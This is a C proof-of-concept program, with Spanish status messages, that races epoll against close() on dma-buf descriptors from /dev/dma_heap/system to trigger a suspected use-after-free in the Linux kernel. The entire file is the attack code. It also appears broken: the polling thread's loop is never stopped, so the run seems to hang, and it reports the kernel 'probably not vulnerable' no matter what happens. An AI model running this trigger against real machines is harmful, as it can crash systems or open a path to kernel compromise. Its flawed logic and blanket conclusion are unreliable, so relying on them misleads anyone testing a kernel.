#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <linux/dma-heap.h>

#define HEAP_PATH "/dev/dma_heap/system"

static volatile int running = 1;
static int dma_buf_fd = -1;

static int alloc_dma_buf(void) {
    int heap_fd = open(HEAP_PATH, O_RDWR);
    if (heap_fd < 0) {
        perror("open dma_heap");
        return -1;
    }

    struct dma_heap_allocation_data data = {
        .len = 4096,
        .fd_flags = O_RDWR | O_CLOEXEC,
        .heap_flags = 0,
    };

    if (ioctl(heap_fd, DMA_HEAP_IOCTL_ALLOC, &data) < 0) {
        perror("DMA_HEAP_IOCTL_ALLOC");
        close(heap_fd);
        return -1;
    }

    close(heap_fd);
    return data.fd;
}

void *thread_epoll(void *arg) {
    (void)arg;
    int epfd = epoll_create1(0);
    if (epfd < 0) {
        perror("epoll_create1");
        return NULL;
    }

    struct epoll_event ev = {
        .events = EPOLLIN | EPOLLOUT | EPOLLRDHUP,
        .data.fd = dma_buf_fd,
    };

    if (epoll_ctl(epfd, EPOLL_CTL_ADD, dma_buf_fd, &ev) < 0) {
        close(epfd);
        return NULL;
    }

    while (running) {
        struct epoll_event out;
        int n = epoll_wait(epfd, &out, 1, 0);
        if (n < 0 && errno != EINTR) {
            break;
        }
    }

    close(epfd);
    return NULL;
}

void *thread_close(void *arg) {
    (void)arg;
    for (volatile int i = 0; i < 100; i++) {}
    if (dma_buf_fd >= 0) {
        close(dma_buf_fd);
        dma_buf_fd = -1;
    }
    return NULL;
}

int main(int argc, char **argv) {
    printf("[*] dma_buf_poll UAF PoC\n");
    printf("[*] Heap: %s\n", HEAP_PATH);

    int test_fd = open(HEAP_PATH, O_RDWR);
    if (test_fd < 0) {
        perror("open heap");
        printf("[!] No se puede acceder a %s\n", HEAP_PATH);
        return 1;
    }
    close(test_fd);
    printf("[+] Heap accesible\n");

    int iterations = 100000;
    if (argc > 1) {
        iterations = atoi(argv[1]);
    }

    printf("[*] Lanzando %d iteraciones\n", iterations);

    for (int i = 0; i < iterations; i++) {
        dma_buf_fd = alloc_dma_buf();
        if (dma_buf_fd < 0) {
            printf("[!] alloc fallo en iteracion %d\n", i);
            break;
        }

        running = 1;

        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread_epoll, NULL);
        pthread_create(&t2, NULL, thread_close, NULL);
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        if (dma_buf_fd >= 0) {
            close(dma_buf_fd);
            dma_buf_fd = -1;
        }

        if (i % 1000 == 0 && i > 0) {
            printf("[*] Iteracion %d/%d\n", i, iterations);
            fflush(stdout);
        }
    }

    printf("[+] PoC terminado. Kernel probablemente NO vulnerable.\n");
    return 0;
}
